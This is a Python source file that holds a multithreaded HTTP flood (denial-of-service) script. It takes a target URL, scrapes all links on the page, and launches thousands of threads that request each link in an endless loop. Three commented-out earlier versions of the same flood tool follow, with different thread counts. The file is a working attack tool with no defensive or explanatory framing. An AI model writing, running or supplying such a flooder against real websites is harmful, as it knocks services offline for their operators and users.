import threading
import requests
import logging
import logging.config
import sys
import requests
from bs4 import BeautifulSoup

# logging.basicConfig(filename='example.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s', datefmt='%d-%b-%y %H:%M:%S')

# logging.basicConfig(filename='example.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s - %(pathname)s:%(lineno)d', datefmt='%d-%b-%y %H:%M:%S')


logging.basicConfig(filename='app.log', filemode='w', format='%(asctime)s \n\t%(levelname)s - %(message)s', datefmt='%d-%b-%y %H:%M:%S')

def dos(target,count):
    while True:
        try:
            res = requests.get(target)
            print(count)
            if count == 1:
               logging.error(res.text)  
            print("Request sent!")
            isFirst = False
            #sys.exit(0)
        except requests.exceptions.ConnectionError:
            print("[!!!] " + "Connection error!")

threads = 10000
url = input("Please enter target url :")

reqs = requests.get(url)
soup = BeautifulSoup(reqs.text, 'html.parser')
 
urls = []
for link in soup.find_all('a'):
    urls.append(link.get('href'))

for i in range(0, threads):
    for u in urls:
        targetUri = f'{url}/{u}'
        print("Attacting to " + targetUri)
        thr = threading.Thread(target=dos, args=(targetUri, i))
        thr.start()
    print(str(i + 1) + " threads started!")







# import threading
# import requests

# def dos(target):
#     while True:
#         try:
#             res = requests.get(target)
#             print("Request sent!")
#         except requests.exceptions.ConnectionError:
#             print("[!!!] " + "Connection error!")

# threads = 100
# url = input("Please enter target url: ")
# for i in range(0, threads):
#     thr = threading.Thread(target=dos, args=(url,))
#     thr.start()
#     print(str(i + 1) + " threads started!")














# import threading
# import requests
# import sys
# print(sys.path)


# def dos(target):
#     while True:
#         try:
#             res = requests.get(target)
#             print("Request sent!")
#         except requests.exceptions.ConnectionError:
#             print("[!!!] " + "Connection error!")

# threads = 1000
# url = input("Please enter target url: ")
# for i in range(0, threads):
#     thr = threading.Thread(target=dos, args=(url,))
#     thr.start()
#     print(str(i + 1) + " threads started!")


# import threading
# import requests

# def dos(target):
#     while True:
#         try:
#             res = requests.get(target)
#             print("Request sent!")
#         except requests.exceptions.ConnectionError:
#             print("[!!!] " + "Connection error!")

# threads = 20
# url = input("Please enter target URL: ")
# for i in range(0, threads):
#     thr = threading.Thread(target=dos, args=(url,))
#     thr.start()
#     print(str(i + 1) + " threads started!")
